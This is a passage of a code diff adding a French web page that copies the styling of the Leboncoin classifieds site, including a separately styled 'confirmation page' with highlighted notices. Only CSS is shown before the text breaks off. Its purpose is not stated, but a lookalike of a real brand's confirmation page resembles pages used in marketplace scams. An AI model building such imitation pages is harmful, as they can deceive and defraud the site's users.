@@ -1,0 +1,1839 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Leboncoin, site de petites annonces gratuites</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <style>
+    /* Votre CSS existant ici */
+    :root {
+      --leboncoin-orange: #F26C2A;
+      --leboncoin-dark-gray: #555;
+      --leboncoin-light-gray-bg: #f5f5f5;
+      --leboncoin-white: #fff;
+      --leboncoin-medium-gray: #aaa;
+      --leboncoin-footer-bg: #3A474E;
+      --leboncoin-footer-text: #E0E0E0;
+      --leboncoin-footer-link-hover: #F26C2A;
+      --vibrant-yellow: #FFFFEB; /* Couleur jaune clair pour les fonds des textes importants */
+      --dark-text-color: #333; /* Couleur de texte foncée pour un bon contraste */
+    }
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: 'Open Sans', Arial, sans-serif;
+      background-color: var(--leboncoin-light-gray-bg); /* Couleur de fond générale, uniforme */
+      overflow-x: hidden; /* Empêche le débordement horizontal */
+    }
+
+    body.no-scroll {
+      overflow: hidden;
+    }
+
+    a {
+      text-decoration: none;
+      color: inherit;
+    }
+
+    ul {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+    }
+
+    button {
+      border: none;
+      background: none;
+      cursor: pointer;
+      padding: 0;
+    }
+
+    .page-container {
+      max-width: 1200px;
+      margin: 0 auto; /* Centre le conteneur principal */
+      background-color: var(--leboncoin-white);
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
+      position: relative;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* Nouveau style pour le wrapper fixe de l'en-tête */
+    .header-fixed-wrapper {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        z-index: 100;
+        background-color: var(--leboncoin-white);
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    }
+
+    /* Centre les éléments à l'intérieur du wrapper fixe */
+    .header-fixed-wrapper .top-header,
+    .header-fixed-wrapper .categories-nav {
+        max-width: 1200px;
+        margin: 0 auto;
+    }
+
+    .top-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 15px 25px;
+      background-color: var(--leboncoin-white);
+      min-height: 70px;
+    }
+
+    .hamburger-menu {
+      display: none;
+      font-size: 28px;
+      color: var(--leboncoin-dark-gray);
+    }
+
+    /* Styles pour le logo image */
+    .logo-img {
+      height: 40px; /* Ajustez la hauteur selon vos besoins */
+      width: auto;
+      display: block;
+    }
+
+    .logo-link {
+        margin-right: 25px;
+        z-index: 5;
+        display: flex;
+        align-items: center;
+    }
+
+
+    .deposer-annonce {
+      display: flex;
+      align-items: center;
+      background-color: var(--leboncoin-orange);
+      color: var(--leboncoin-white);
+      padding: 12px 25px;
+      height: 48px;
+      box-sizing: border-box;
+      border-radius: 25px;
+      font-weight: bold;
+      font-size: 16px;
+      margin-right: 25px;
+      white-space: nowrap;
+    }
+
+    .deposer-annonce .fa-plus {
+      margin-right: 10px;
+      font-size: 18px;
+    }
+
+    .search-bar-wrapper {
+        display: flex;
+        flex-grow: 1;
+        border-radius: 28px;
+        background-color: var(--leboncoin-light-gray-bg);
+        overflow: hidden;
+        margin: 0 15px;
+        z-index: 1;
+        min-width: 350px;
+        height: 48px;
+        box-sizing: border-box;
+    }
+
+    .search-bar-wrapper .search-input-area {
+        position: relative;
+        flex-grow: 1;
+        display: flex;
+        align-items: center;
+        background-color: transparent;
+        padding-right: 0;
+    }
+
+    .search-bar-wrapper input {
+        width: 100%;
+        border: none;
+        padding: 0 20px;
+        background-color: transparent;
+        outline: none;
+        font-size: 16px;
+        color: var(--leboncoin-dark-gray);
+        box-sizing: border-box;
+        height: 100%;
+    }
+
+    .search-bar-wrapper input::placeholder {
+        color: #777777;
+    }
+
+    .search-button-combined {
+        background-color: transparent;
+        padding: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: var(--leboncoin-white);
+        flex-shrink: 0;
+        border-radius: 0;
+        height: 100%;
+    }
+
+    .search-button-combined .search-icon-circle {
+        width: 48px;
+        height: 48px;
+        background-color: var(--leboncoin-orange);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-right: 5px;
+        flex-shrink: 0;
+    }
+
+    .search-button-combined .search-icon-circle .fa-magnifying-glass {
+        color: var(--leboncoin-white);
+        font-size: 20px;
+    }
+
+    .nav-icons {
+      display: flex;
+      margin-left: 25px;
+      align-items: center;
+    }
+
+    .nav-icons li {
+      margin-left: 30px;
+      white-space: nowrap;
+    }
+
+    .nav-icons a {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: var(--leboncoin-dark-gray);
+      font-size: 13px;
+      height: 100%;
+    }
+
+    .nav-icons .fa-solid {
+      font-size: 24px;
+      margin-bottom: 5px;
+    }
+
+    /* New "Connectez-vous" button for mobile */
+    .mobile-login-btn {
+        display: none; /* Hidden by default on desktop */
+    }
+
+    .categories-nav {
+      background-color: var(--leboncoin-white);
+      padding: 15px 0;
+      border-top: 1px solid #eee;
+      text-align: center;
+    }
+
+    .categories-nav ul {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 25px;
+    }
+
+    .categories-nav li {
+      position: relative;
+      margin: 0 15px;
+      font-size: 16px;
+      color: var(--leboncoin-dark-gray);
+      white-space: nowrap;
+      padding: 7px 0;
+    }
+
+    .categories-nav li:not(:last-child)::after {
+      content: '•';
+      position: absolute;
+      right: -15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #ddd;
+      font-size: 18px;
+    }
+
+    .categories-nav a:hover {
+      color: var(--leboncoin-orange);
+    }
+
+    .main-content {
+        flex-grow: 1;
+        padding-top: 140px; /* Ajustez cette valeur pour compenser la hauteur du header fixe (env. 70px + 70px) */
+    }
+
+    .mobile-menu-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s, visibility 0.3s;
+    }
+
+    .mobile-menu-overlay.is-open {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .mobile-menu {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 80%;
+      max-width: 300px;
+      height: 100%;
+      background-color: var(--leboncoin-white);
+      z-index: 1001;
+      box-shadow: 2px 0 10px rgba(0, 0, 0, 0.2);
+      transform: translateX(-100%);
+      transition: transform 0.3s;
+      display: flex;
+      flex-direction: column;
+      overflow-y: auto;
+    }
+
+    .mobile-menu::-webkit-scrollbar {
+        display: none;
+    }
+
+    .mobile-menu {
+        scrollbar-width: none;
+    }
+
+    .mobile-menu.is-open {
+      transform: translateX(0);
+    }
+
+    .mobile-menu-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px 20px;
+      border-bottom: 1px solid #eee;
+    }
+
+    .mobile-menu-header .logo-link {
+      margin-right: 0;
+    }
+
+    .mobile-menu-header .logo-img {
+      height: 32px; /* Ajustez pour le mobile menu */
+    }
+
+    .mobile-menu-nav li {
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .mobile-menu-nav a {
+      display: flex;
+      align-items: center;
+      padding: 15px 20px;
+      font-size: 16px;
+      color: var(--leboncoin-dark-gray);
+    }
+
+    .mobile-menu-nav a .fa-solid {
+      font-size: 20px;
+      margin-right: 15px;
+    }
+
+    .mobile-menu-nav .category-header {
+      font-weight: bold;
+      color: var(--leboncoin-medium-gray);
+      padding: 15px 20px 5px;
+      font-size: 14px;
+      border-bottom: none;
+    }
+
+    .mobile-menu-nav .section-separator {
+      height: 10px;
+      background-color: #f8f8f8;
+      border-bottom: 1px solid #eee;
+    }
+
+    .mobile-menu-nav .login-section {
+      padding: 15px 20px;
+      border-top: 1px solid #eee;
+      font-size: 16px;
+      font-weight: bold;
+    }
+
+    .call-to-action-banner {
+      background-color: #FEEFE8;
+      border-radius: 12px;
+      padding: 25px 20px;
+      text-align: center;
+      margin: 40px auto;
+      max-width: 1000px;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+    }
+
+    .call-to-action-banner h2 {
+      font-size: 28px;
+      color: #3A474E;
+      margin-bottom: 20px;
+      font-weight: 600;
+    }
+
+    .call-to-action-banner .deposer-annonce-banner {
+      display: inline-flex;
+      align-items: center;
+      background-color: var(--leboncoin-orange);
+      color: var(--leboncoin-white);
+      padding: 12px 25px;
+      border-radius: 30px;
+      font-weight: bold;
+      font-size: 16px;
+      transition: background-color 0.3s ease;
+    }
+
+    .call-to-action-banner .deposer-annonce-banner:hover {
+      background-color: #e06020;
+    }
+
+    .banner-decoration {
+      position: absolute;
+      opacity: 0.7;
+      border-radius: 50%;
+      z-index: 0;
+    }
+
+    .banner-decoration.top-right {
+      width: 120px;
+      height: 120px;
+      top: -60px;
+      right: -60px;
+      transform: rotate(30deg);
+      background: linear-gradient(135deg, #a0c2e3 0%, #87aedb 100%);
+    }
+
+    .banner-decoration.bottom-left {
+      width: 150px;
+      height: 150px;
+      bottom: -75px;
+      left: -75px;
+      transform: rotate(-45deg);
+      background: linear-gradient(135deg, #f0b090 0%, #e09070 100%);
+    }
+
+    .section-title-wrapper {
+        display: flex;
+        justify-content: space-between;
+        align-items: baseline;
+        margin-bottom: 25px;
+        padding-left: 10px;
+        padding-right: 10px;
+    }
+
+    .section-title-wrapper h2 {
+        font-size: 24px;
+        color: #333;
+        margin: 0;
+        font-weight: 600;
+        text-align: left;
+    }
+
+    .section-title-wrapper h3 {
+        font-size: 18px;
+        color: #777;
+        font-weight: normal;
+        margin: 0;
+        text-align: left;
+    }
+
+    .view-more {
+        color: var(--leboncoin-orange);
+        font-weight: bold;
+        font-size: 16px;
+        white-space: nowrap;
+        display: flex;
+        align-items: center;
+        gap: 5px;
+    }
+
+    .view-more:hover {
+        text-decoration: underline;
+    }
+
+    .view-more .fa-arrow-right {
+        font-size: 14px;
+    }
+
+    .lbc-current-deals-section,
+    .trends-section,
+    .top-categories-image-carousel-section {
+      max-width: 1000px;
+      margin: 40px auto;
+      padding: 0 20px;
+    }
+
+    .lbc-current-deals-grid-container,
+    .trends-card-container,
+    .top-categories-image-carousel-container {
+      display: flex;
+      gap: 15px;
+      flex-wrap: nowrap;
+      overflow-x: auto;
+      -webkit-overflow-scrolling: touch;
+      padding-bottom: 10px;
+    }
+
+    .lbc-current-deals-grid-container::-webkit-scrollbar,
+    .trends-card-container::-webkit-scrollbar,
+    .top-categories-image-carousel-container::-webkit-scrollbar {
+        display: none;
+    }
+
+    .lbc-current-deals-grid-container,
+    .trends-card-container,
+    .top-categories-image-carousel-container {
+        scrollbar-width: none;
+    }
+
+    .lbc-deal-card {
+      background-color: var(--leboncoin-white);
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+      flex-shrink: 0;
+      width: 220px;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      height: 320px;
+    }
+
+    .lbc-deal-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+    }
+
+    .lbc-deal-card-image-wrapper {
+      position: relative;
+      width: 100%;
+      height: 180px;
+      overflow: hidden;
+    }
+
+    .lbc-deal-card-image {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    .lbc-deal-card-favorite-icon {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      color: var(--leboncoin-white);
+      font-size: 22px;
+      text-shadow: 0 0 5px rgba(0,0,0,0.5);
+      z-index: 1;
+      cursor: pointer;
+    }
+
+    .lbc-deal-card-content {
+      padding: 10px 15px;
+      flex-grow: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    .lbc-deal-card-price {
+      font-size: 20px;
+      font-weight: bold;
+      color: var(--leboncoin-dark-gray);
+      margin-bottom: 5px;
+    }
+
+    .lbc-deal-card-title {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 5px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      display: -webkit-box;
+      -webkit-box-orient: vertical;
+      line-height: 1.3;
+      max-height: 2.6em;
+    }
+
+    .lbc-deal-card-location {
+      font-size: 13px;
+      color: #777;
+      margin-top: auto;
+      margin-bottom: 2px;
+      overflow: hidden;
+      white-space: nowrap;
+      text-overflow: ellipsis;
+    }
+
+    .lbc-deal-card-date {
+      font-size: 12px;
+      color: #999;
+      margin-bottom: 0;
+      white-space: nowrap;
+    }
+
+    .lbc-deal-card-delivery-info {
+        font-size: 12px;
+        color: var(--leboncoin-orange);
+        font-weight: bold;
+        margin-top: 5px;
+    }
+
+    .trends-card {
+        width: calc(20% - 16px);
+        flex-shrink: 0;
+        background-color: var(--leboncoin-white);
+        border-radius: 8px;
+        overflow: hidden;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        text-align: left;
+        display: flex;
+        flex-direction: column;
+        transition: transform 0.2s ease, box-shadow 0.2s ease;
+        box-sizing: border-box;
+        height: 250px;
+    }
+
+    .trends-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+    }
+
+    .trends-card img {
+        width: 100%;
+        height: 160px;
+        object-fit: cover;
+        display: block;
+    }
+
+    .trends-card-content {
+        padding: 15px;
+        flex-grow: 1;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: calc(250px - 160px);
+        box-sizing: border-box;
+    }
+
+    .trends-card-content p {
+        font-size: 16px;
+        color: var(--leboncoin-dark-gray);
+        margin: 0;
+        font-weight: 600;
+        text-align: center;
+    }
+
+    .carousel-card {
+      position: relative;
+      width: calc((100% - 4 * 20px) / 5);
+      flex-shrink: 0;
+      height: 200px;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      background-color: var(--leboncoin-white);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      box-sizing: border-box;
+    }
+
+    .carousel-card:hover:not(.ad-card) {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+    }
+
+    .carousel-card .carousel-image {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    .overlay-text-bottom-left {
+      position: absolute;
+      bottom: 15px;
+      left: 15px;
+      color: var(--leboncoin-white);
+      font-size: 18px;
+      font-weight: bold;
+      text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
+      z-index: 1;
+    }
+
+    .navigation-arrow {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 40px;
+      height: 40px;
+      background-color: var(--leboncoin-white);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      color: var(--leboncoin-dark-gray);
+      cursor: pointer;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+      z-index: 2;
+    }
+
+    .navigation-arrow.left {
+      left: 15px;
+    }
+
+    .navigation-arrow.right {
+      right: 15px;
+    }
+
+    .carousel-card.ad-card {
+      background-color: var(--leboncoin-light-gray-bg);
+      color: var(--leboncoin-dark-gray);
+      font-size: 18px;
+      font-weight: 600;
+      cursor: default;
+      box-shadow: none;
+    }
+
+    .carousel-card.ad-card:hover {
+        transform: none;
+        box-shadow: none;
+    }
+
+    .static-text-section {
+        max-width: 1000px;
+        margin: 0 auto;
+        padding: 40px 20px;
+        text-align: center;
+        font-size: 16px;
+        line-height: 1.6;
+        color: #333;
+    }
+    .static-text-section p {
+        margin: 0;
+    }
+
+    /* Footer Styles */
+    .main-footer {
+        background-color: var(--leboncoin-footer-bg);
+        color: var(--leboncoin-footer-text);
+        padding: 50px 20px 20px;
+        font-size: 14px;
+        flex-shrink: 0;
+    }
+
+    .footer-content {
+        max-width: 1000px;
+        margin: 0 auto;
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        gap: 20px;
+        padding-bottom: 40px;
+        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .footer-column h3 {
+        font-size: 16px;
+        font-weight: bold;
+        margin-bottom: 20px;
+        color: var(--leboncoin-white);
+        position: relative;
+        padding-bottom: 10px;
+    }
+
+    .footer-column h3::after {
+        content: '';
+        position: absolute;
+        left: 0;
+        bottom: 0;
+        width: 100%;
+        height: 2px;
+        background-color: var(--leboncoin-footer-text);
+        transition: background-color 0.3s ease;
+    }
+
+    .footer-column h3:hover::after {
+        background-color: var(--leboncoin-orange);
+    }
+
+    .footer-column ul {
+        list-style: none;
+        padding: 0;
+        margin: 0;
+    }
+
+    .footer-column li {
+        margin-bottom: 10px;
+    }
+
+    .footer-column a {
+        color: var(--leboncoin-footer-text);
+        text-decoration: none;
+        transition: color 0.3s ease;
+        position: relative;
+        display: inline-block;
+    }
+
+    .footer-column a:hover {
+        color: var(--leboncoin-orange);
+        text-decoration: underline;
+        text-decoration-color: var(--leboncoin-orange);
+        text-decoration-thickness: 1px;
+    }
+
+    .footer-bottom {
+        max-width: 1000px;
+        margin: 20px auto 0;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+        padding-top: 20px;
+    }
+
+    .social-media-links {
+        display: flex;
+        gap: 15px;
+    }
+
+    .social-media-links a {
+        color: var(--leboncoin-footer-text);
+        font-size: 20px;
+        transition: color 0.3s ease;
+    }
+
+    .social-media-links a:hover {
+        color: var(--leboncoin-orange);
+    }
+
+    .app-links {
+        display: flex;
+        gap: 15px;
+        align-items: center;
+    }
+
+    .app-links a {
+        display: block;
+    }
+
+    .app-links img {
+        height: 35px;
+        border-radius: 5px;
+    }
+
+    .copyright {
+        margin-top: 20px;
+        text-align: center;
+        width: 100%;
+        color: rgba(255, 255, 255, 0.5);
+    }
+
+    /* Styles spécifiques à la page de confirmation */
+    /* Suppression des styles sur body qui causaient des débordements */
+    /* background-image, background-size, etc. sont déplacés ou adaptés */
+
+    /* Nouveau wrapper pour centrer la page de confirmation */
+    .confirmation-page-wrapper {
+        max-width: 900px; /* Largeur maximale pour le contenu de la confirmation */
+        margin: 0 auto; /* Centre le wrapper */
+        background-color: var(--leboncoin-white); /* Fond blanc pour la section de confirmation */
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.05); /* Légère ombre pour la distinguer */
+    }
+
+    /* Texte important styles */
+    .important-text-block {
+        background-color: var(--vibrant-yellow); /* Fond jaune clair */
+        color: var(--dark-text-color); /* Texte foncé */
+        padding: 30px; /* Plus de rembourrage */
+        margin: 30px auto; /* Marge pour espacer les blocs */
+        border-radius: 15px; /* Coins arrondis plus prononcés */
+        text-align: center; /* Centrer le texte */
+        font-size: 1.4em; /* Taille de police plus grande */
+        font-weight: 700; /* Texte en gras */
+        line-height: 1.8; /* Espacement des lignes amélioré */
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2); /* Ombre portée plus forte */
+        border: 2px solid rgba(0,0,0,0.1); /* Bordure légère */
+        max-width: 800px; /* Limiter la largeur pour une meilleure lisibilité */
+        transition: all 0.3s ease-in-out; /* Transition pour l'effet hover */
+    }
+
+    .important-text-block:hover {
+        transform: translateY(-5px); /* Léger déplacement vers le haut au survol */
+        box-shadow: 0 12px 30px rgba(0, 0, 0, 0.25); /* Ombre plus forte au survol */
+    }
+
+    .important-text-block p {
+        margin: 10px 0; /* Marge entre les paragraphes à l'intérieur du bloc */
+    }
+
+    .important-text-block .highlight {
+        color: var(--leboncoin-orange);
+        font-weight: 900; /* Plus gras pour la mise en évidence */
+        text-shadow: 0 0 5px rgba(242, 108, 42, 0.3); /* Légère ombre pour le texte highlight */
+    }
+
+    .confirmation-logo {
+        color: #ff6a00;
+        font-size: 28px;
+        font-weight: bold;
+        display: block;
+        text-align: center;
+        padding: 20px 0;
+        background-color: white;
+    }
+
+    .support-image {
+        width: 100%;
+        display: block;
+        height: auto; /* Assure que l'image ne déborde pas en hauteur */
+    }
+
+    .content-container-confirmation {
+        background-color: white;
+        width: 100%;
+        padding: 30px;
+        box-sizing: border-box; /* Inclut le padding dans la largeur totale */
+    }
+
+    .content-container-confirmation h2 {
+        font-size: 28px; /* Augmenté pour l'accroche */
+        margin: 25px 0 20px;
+        text-align: center;
+        color: var(--leboncoin-orange); /* Couleur orange du leboncoin */
+        font-weight: bold;
+        text-shadow: 1px 1px 2px rgba(0,0,0,0.1); /* Petite ombre pour le titre */
+    }
+
+    .confirmation-message {
+        background-color: #f8f9fa;
+        padding: 20px;
+        border-radius: 8px;
+        margin-bottom: 25px;
+        text-align: left;
+    }
+
+    .next-step {
+        margin-top: 25px;
+        padding: 15px;
+        border-left: 3px solid #ff6a00;
+        background-color: #f0fdfe;
+        text-align: left;
+    }
+
+    .next-step strong {
+        display: block;
+        margin-bottom: 8px;
+        color: #ff6a00;
+    }
+
+    .support-text {
+        margin-top: 30px;
+        font-size: 15px;
+        color: #666;
+        text-align: center;
+    }
+
+    .divider {
+        border-top: 1px solid #e1e3e5;
+        margin: 25px 0;
+    }
+
+    .back-button {
+        background-color: var(--leboncoin-orange); /* Bouton orange */
+        color: var(--leboncoin-white);
+        border: none; /* Pas de bordure par défaut */
+        padding: 15px 30px; /* Plus grand */
+        border-radius: 8px; /* Coins plus arrondis */
+        font-size: 18px; /* Texte plus grand */
+        font-weight: bold;
+        cursor: pointer;
+        width: 100%;
+        max-width: 250px; /* Largeur maximale ajustée */
+        margin: 40px auto 0; /* Marge supérieure plus grande et centrage */
+        display: block;
+        transition: all 0.3s ease-in-out;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.2); /* Ombre pour le bouton */
+    }
+
+    .back-button:hover {
+        background-color: #e06020; /* Orange plus foncé au survol */
+        transform: translateY(-3px); /* Léger déplacement */
+        box-shadow: 0 6px 15px rgba(0,0,0,0.3); /* Ombre plus prononcée */
+    }
+
+    .confirmation-image {
+        width: 100%;
+        display: block;
+        height: auto; /* Assure que l'image ne déborde pas en hauteur */
+    }
+
+    /* Styles pour la bande défilante */
+    .scrolling-band-container {
+        width: 100%;
+        max-width: 900px; /* Aligné avec confirmation-page-wrapper */
+        margin: 0 auto; /* Centre la bande */
+        background-color: white; /* Fond blanc pour correspondre à la page */
+        display: flex;
+        border-radius: 0 0 8px 8px; /* Bords arrondis seulement en bas si nécessaire, sinon 0 */
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        overflow: hidden;
+        height: 50px;
+        margin-top: 0; /* Supprime l'espacement entre l'image et la bande */
+        border-top: none; /* Pas de bordure supérieure si elle suit l'image */
+    }
+
+    .scrolling-band-container .content-area {
+        flex-grow: 1;
+        padding: 10px;
+        overflow: hidden;
+        display: flex;
+        align-items: center;
+    }
+
+    .scrolling-band-container .scrolling-wrapper {
+        white-space: nowrap;
+        display: inline-block;
+        animation: scrollText 30s linear infinite;
+        font-size: 0.9em;
+        color: #333;
+    }
+
+    .scrolling-band-container .scrolling-wrapper p {
+        display: inline-block;
+        margin: 0;
+        padding-right: 50px;
+    }
+
+    @keyframes scrollText {
+        0% { transform: translateX(100%); }
+        100% { transform: translateX(-100%); }
+    }
+
+    .scrolling-band-container .sidebar {
+        width: 450px; /* Garder la largeur spécifique */
+        background-color: #222;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        color: white;
+        cursor: pointer;
+    }
+
+    .scrolling-band-container .sidebar .arrow {
+        font-size: 1.5em;
+        display: inline-block;
+        animation: arrowMove 1s ease-in-out infinite alternate;
+    }
+
+    @keyframes arrowMove {
+        0% { transform: translateY(0); }
+        100% { transform: translateY(5px); }
+    }
+
+
+    /* ************************************************************* */
+    /* Règles CSS pour mobile (max-width: 768px)       */
+    /* ************************************************************* */
+    @media (max-width: 768px) {
+      .top-header {
+        flex-wrap: wrap;
+        justify-content: flex-start;
+        padding: 15px 20px;
+      }
+
+      .hamburger-menu {
+        display: block;
+        margin-right: 15px;
+        order: 1;
+        position: relative;
+        z-index: 10;
+      }
+
+      .logo-link {
+        flex-grow: 1;
+        text-align: center;
+        margin-right: 0;
+        order: 2;
+        flex-shrink: 0;
+        position: relative;
+        z-index: 9;
+        justify-content: center; /* Center logo image on mobile */
+      }
+
+      .logo-img {
+        height: 32px; /* Ajustez pour le mobile */
+      }
+
+      /* Adjust top-header::after for mobile */
+      .top-header::after {
+        content: '';
+        display: none; /* Hide the empty space used for alignment on desktop */
+      }
+
+      .deposer-annonce,
+      .nav-icons {
+        display: none;
+      }
+
+      /* Show and style the new mobile login button */
+      .mobile-login-btn {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background-color: var(--leboncoin-white);
+        border: 1px solid var(--leboncoin-orange);
+        color: var(--leboncoin-orange);
+        padding: 8px 15px;
+        border-radius: 5px;
+        font-weight: bold;
+        font-size: 14px;
+        height: 35px;
+        box-sizing: border-box;
+        margin-left: auto;
+        order: 3;
+        flex-shrink: 0;
+        white-space: nowrap;
+      }
+
+      .mobile-login-btn span {
+          margin: 0;
+          font-weight: bold;
+      }
+
+      .search-bar-wrapper {
+        width: calc(100% - 40px);
+        order: 4;
+        margin-top: 20px;
+        margin-left: auto;
+        margin-right: auto;
+        padding: 0;
+        display: flex;
+        height: auto;
+        position: relative;
+        z-index: 5;
+      }
+
+      .search-input-area input {
+        padding: 15px 20px 15px 45px;
+      }
+
+      .search-bar-wrapper .input-icon {
+        display: block;
+        position: absolute;
+        left: 15px;
+        top: 50%;
+        transform: translateY(-50%);
+        font-size: 18px;
+        color: #777777;
+        z-index: 6;
+      }
+
+      .search-button-combined {
+        display: none;
+      }
+
+      .categories-nav {
+        display: block;
+        padding: 10px 0;
+        overflow-x: auto;
+        -webkit-overflow-scrolling: touch;
+        white-space: nowrap;
+        border-top: none;
+        background-color: var(--leboncoin-white);
+        box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+      }
+
+      .categories-nav::-webkit-scrollbar {
+          display: none;
+      }
+
+      .categories-nav {
+          scrollbar-width: none;
+      }
+
+      .categories-nav .categories-scroll-wrapper {
+        display: flex;
+        padding: 0 10px;
+      }
+
+      .categories-nav ul {
+        display: inline-flex;
+        justify-content: flex-start;
+        flex-wrap: nowrap;
+        padding: 0;
+        margin: 0;
+      }
+
+      .categories-nav li {
+        margin: 0 10px;
+        padding: 5px 0;
+        flex-shrink: 0;
+      }
+
+      .categories-nav li:not(:last-child)::after {
+        content: '';
+        display: none;
+      }
+
+      .main-content {
+        padding-top: 200px; /* Ajustez cette valeur pour mobile, le header est plus haut */
+      }
+
+      .call-to-action-banner {
+        margin: 20px 15px;
+        padding: 20px 15px;
+      }
+
+      .call-to-action-banner h2 {
+        font-size: 22px;
+        margin-bottom: 15px;
+      }
+
+      .call-to-action-banner .deposer-annonce-banner {
+        padding: 10px 20px;
+        font-size: 15px;
+      }
+
+      .banner-decoration.top-right {
+        width: 80px;
+        height: 80px;
+        top: -40px;
+        right: -40px;
+      }
+
+      .banner-decoration.bottom-left {
+        width: 100px;
+        height: 100px;
+        bottom: -50px;
+        left: -50px;
+      }
+
+      .section-title-wrapper {
+          flex-direction: row;
+          align-items: center;
+          margin-bottom: 15px;
+          padding-left: 15px;
+          padding-right: 15px;
+      }
+
+      .section-title-wrapper h2,
+      .section-title-wrapper h3 {
+          text-align: left;
+          margin: 0;
+      }
+
+      .section-title-wrapper h2 {
+        font-size: 20px;
+      }
+
+      .section-title-wrapper h3 {
+        font-size: 16px;
+      }
+
+      .view-more {
+          font-size: 0;
+          margin-left: auto;
+      }
+
+      .view-more .fa-arrow-right {
+          font-size: 20px;
+          margin: 0;
+      }
+
+      .lbc-current-deals-section,
+      .trends-section,
+      .top-categories-image-carousel-section {
+        margin: 20px auto;
+        padding: 0 15px;
+      }
+
+      .lbc-current-deals-grid-container {
+        gap: 10px;
+        justify-content: flex-start;
+      }
+
+      .lbc-deal-card {
+        width: 160px;
+        height: 280px;
+      }
+
+      .lbc-deal-card-image-wrapper {
+        height: 140px;
+      }
+
+      .lbc-deal-card-favorite-icon {
+        font-size: 18px;
+        top: 8px;
+        right: 8px;
+      }
+
+      .lbc-deal-card-price {
+        font-size: 18px;
+      }
+
+      .lbc-deal-card-title {
+        font-size: 14px;
+        max-height: 2.4em;
+      }
+
+      .lbc-deal-card-location {
+        font-size: 11px;
+      }
+
+      .lbc-deal-card-date {
+        font-size: 10px;
+      }
+
+      .trends-section {
+          margin: 20px 0;
+          padding: 0 15px;
+      }
+
+      .trends-card-container {
+          justify-content: flex-start;
+          gap: 15px;
+      }
+
+      .trends-card {
+          width: 180px;
+          height: 220px;
+          flex-shrink: 0;
+      }
+
+      .trends-card img {
+        height: 130px;
+      }
+
+      .trends-card-content {
+        height: calc(220px - 130px);
+      }
+
+      .top-categories-image-carousel-section {
+        margin: 30px auto;
+        padding: 0 15px;
+      }
+      .top-categories-image-carousel-container {
+        justify-content: flex-start;
+        gap: 15px;
+      }
+      .carousel-card {
+        width: 220px;
+        height: 180px;
+      }
+      .overlay-text-bottom-left {
+        font-size: 16px;
+        bottom: 10px;
+        left: 10px;
+      }
+      .navigation-arrow {
+        width: 35px;
